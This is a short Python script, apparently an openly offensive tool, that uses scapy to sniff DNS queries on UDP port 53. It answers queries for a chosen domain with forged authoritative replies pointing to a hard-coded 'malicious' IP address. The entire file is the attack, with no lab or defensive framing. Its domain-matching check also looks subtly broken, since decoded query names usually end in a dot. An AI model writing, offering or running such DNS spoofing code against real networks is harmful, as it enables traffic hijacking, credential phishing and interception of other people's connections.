from scapy.all import *

target_domain = "example.com"
malicious_ip = "192.168.0.100"

# function that spoofs dns responses
def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qd.qname.decode() == target_domain:
        # create dns packet
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                          an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=malicious_ip))
        send(spoofed_pkt)
        print(f"Spoofed DNS response sent for {target_domain} to {pkt[IP].src}")

# sniff dns requests on port 53
if __name__ == "__main__":
    sniff(filter="udp port 53", prn=spoof_dns)

